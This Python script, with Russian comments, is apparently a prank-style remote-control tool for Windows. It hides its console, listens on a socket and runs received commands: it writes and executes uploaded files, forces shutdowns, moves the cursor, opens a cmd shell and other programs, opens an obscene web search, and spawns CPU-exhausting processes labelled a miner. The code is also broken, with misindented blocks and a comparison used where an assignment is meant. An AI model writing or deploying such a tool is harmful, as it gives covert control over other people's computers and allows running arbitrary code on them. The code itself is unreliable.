import socket
import threading
import ctypes
import time
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser
import multiprocessing

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def safe_shutdown_windows(delay_seconds=0):
    try:
        # shutdown /s — выключение; /t — задержка в сотнях миллисекунд; /f — принудительное закрытие программ
        cmd = ['shutdown', '/s', '/t', str(delay_seconds * 1), '/f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Выключение запланировано через {delay_seconds} секунд")
        else:
            print(f"Ошибка: {result.stderr}")
    except Exception as e:
        print(f"Исключение: {e}")

def win_error(title, msg):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, msg)
    root.destroy()

MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

def move_cursor(x, y):
    """Перемещение курсора в абсолютные координаты."""
    ctypes.windll.user32.SetCursorPos(x, y)

def download_and_run_app(client_socket, file_data, filename):
    """
    Скачивает файл и запускает его на сервере.
    file_data — байтовые данные файла, filename — имя файла.
    """
    try:
        # Сохраняем файл во временную директорию
        temp_path = os.path.join(os.getcwd(), 'temp')
        os.makedirs(temp_path, exist_ok=True)
        file_path = os.path.join(temp_path, filename)

        with open(file_path, 'wb') as f:
            f.write(file_data)

        # Запускаем файл
        if filename.lower().endswith('.exe'):
            subprocess.Popen([file_path])
            return f"Приложение {filename} запущено"
        elif filename.lower().endswith(('.py', '.pyw')):
            subprocess.Popen(['python', file_path])
            return f"Скрипт {filename} запущен"
        else:
            # Для других типов файлов пытаемся открыть стандартными средствами ОС
            os.startfile(file_path)
            return f"Файл {filename} открыт"
    except Exception as e:
        return f"Ошибка при скачивании/запуске: {str(e)}"

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Получена команда: {data}")
            if data.startswith('download_run:'):
                # Формат: download_run:имя_файла:данные_в_hex
                parts = data.split(':', 2)
                if len(parts) == 3:
                    filename = parts[1]
                    file_data_hex = parts[2]
                    try:
                        file_data = bytes.fromhex(file_data_hex)
                        response = download_and_run_app(client_socket, file_data, filename)
                    except ValueError:
                        response = "Ошибка: неверные данные файла (не hex)"
                else:
                    response = "Ошибка: неверный формат команды"
            else:
                response = execute_command(data)

            client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print(f"Ошибка обработки клиента: {e}")
            break
    client_socket.close()

def execute_command(cmd):
    if cmd == "курсор":
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
    elif cmd == "выкл пк":
        safe_shutdown_windows(3)
    elif cmd == "сообщение":
        win_error("сообщение", "сообщение от некого приложения)")
    elif cmd == "калькулятор":
        os.system('calc')
    elif cmd == "диспетчер задач":
        os.system('taskmgr')
    elif cmd == "блокнот":
        os.system('notepad')
    elif cmd == "проводник":
        os.system('explorer')
    elif cmd == "cmd":
        os.system('cmd')
    elif cmd == "paint":
        os.system('mspaint')
    elif cmd == "панель управления":
        os.system('control')
    elif cmd == "клавиатура":
        os.system('osk')
    elif cmd == "гугл":
        url = "https://www.google.com"
        webbrowser.open(url)
    elif cmd == "покойо":
        url == "https://www.pocoyo.com"
        webbrowser.open(url)
    elif cmd == "18+":
        url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
        webbrowser.open(url)
    elif cmd == "майнер":
        def cpu_worker():
         while True:
          x = 0
          for i in range(1000000):
            x += i ** 2
          time.sleep(0.001)
          print('запущен майнер')
        num_cores = multiprocessing.cpu_count()
    processes = []

    for _ in range(num_cores):
        p = multiprocessing.Process(target=cpu_worker)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

    else:
        win_error("сообщение", f"{cmd}")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 8888))
server.listen(5)
print("Сервер запущен, ожидает команд...")

while True:
    client, addr = server.accept()
    print(f"Подключение от {addr}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()